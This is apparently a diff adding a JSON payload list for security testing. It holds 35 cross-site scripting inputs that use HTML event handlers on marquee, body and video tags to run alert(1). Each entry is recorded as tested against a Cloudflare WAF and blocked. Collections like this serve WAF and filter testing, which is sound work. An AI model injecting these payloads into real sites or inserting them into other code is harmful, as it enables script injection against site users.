@@ -1,0 +1,497 @@
+{
+  "category": "xss",
+  "subcategory": "event_handlers",
+  "count": 35,
+  "payloads": [
+    {
+      "id": "xss-1016",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<marquee onbounce=alert(1)>x</marquee>",
+      "description": "onbounce event",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1017",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<marquee onfinish=alert(1)>x</marquee>",
+      "description": "onfinish event",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1018",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<marquee onstart=alert(1)>x</marquee>",
+      "description": "onstart event",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1019",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onbeforeprint=alert(1)>",
+      "description": "onbeforeprint",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1020",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onafterprint=alert(1)>",
+      "description": "onafterprint",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1021",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onbeforeunload=alert(1)>",
+      "description": "onbeforeunload",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1022",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onhashchange=alert(1)>",
+      "description": "onhashchange",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1023",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onmessage=alert(1)>",
+      "description": "onmessage",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1024",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onoffline=alert(1)>",
+      "description": "onoffline",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1025",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body ononline=alert(1)>",
+      "description": "ononline",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1026",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onpagehide=alert(1)>",
+      "description": "onpagehide",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1027",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onpageshow=alert(1)>",
+      "description": "onpageshow",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1028",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onpopstate=alert(1)>",
+      "description": "onpopstate",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1029",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onstorage=alert(1)>",
+      "description": "onstorage",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1030",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<body onunload=alert(1)>",
+      "description": "onunload",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1031",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video oncanplay=alert(1)><source></video>",
+      "description": "oncanplay",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1032",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video oncanplaythrough=alert(1)><source></video>",
+      "description": "oncanplaythrough",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1033",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video ondurationchange=alert(1)><source></video>",
+      "description": "ondurationchange",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1034",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onemptied=alert(1)><source></video>",
+      "description": "onemptied",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1035",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onended=alert(1)><source></video>",
+      "description": "onended",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1036",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onloadeddata=alert(1)><source></video>",
+      "description": "onloadeddata",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1037",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onloadedmetadata=alert(1)><source></video>",
+      "description": "onloadedmetadata",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1038",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onloadstart=alert(1)><source></video>",
+      "description": "onloadstart",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1039",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onpause=alert(1)><source></video>",
+      "description": "onpause",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1040",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onplay=alert(1)><source></video>",
+      "description": "onplay",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1041",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onplaying=alert(1)><source></video>",
+      "description": "onplaying",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1042",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onprogress=alert(1)><source></video>",
+      "description": "onprogress",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1043",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onratechange=alert(1)><source></video>",
+      "description": "onratechange",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1044",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onseeked=alert(1)><source></video>",
+      "description": "onseeked",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1045",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onseeking=alert(1)><source></video>",
+      "description": "onseeking",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1046",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onstalled=alert(1)><source></video>",
+      "description": "onstalled",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1047",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onsuspend=alert(1)><source></video>",
+      "description": "onsuspend",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1048",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video ontimeupdate=alert(1)><source></video>",
+      "description": "ontimeupdate",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1049",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onvolumechange=alert(1)><source></video>",
+      "description": "onvolumechange",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    },
+    {
+      "id": "xss-1050",
+      "category": "xss",
+      "subcategory": "event_handlers",
+      "payload": "<video onwaiting=alert(1)><source></video>",
+      "description": "onwaiting",
+      "technique": "basic",
+      "source": "generated",
+      "tested_against": [
+        "cloudflare_waf"
+      ],
+      "success_rate": 0.0,
+      "blocked": true
+    }
+  ]
+}
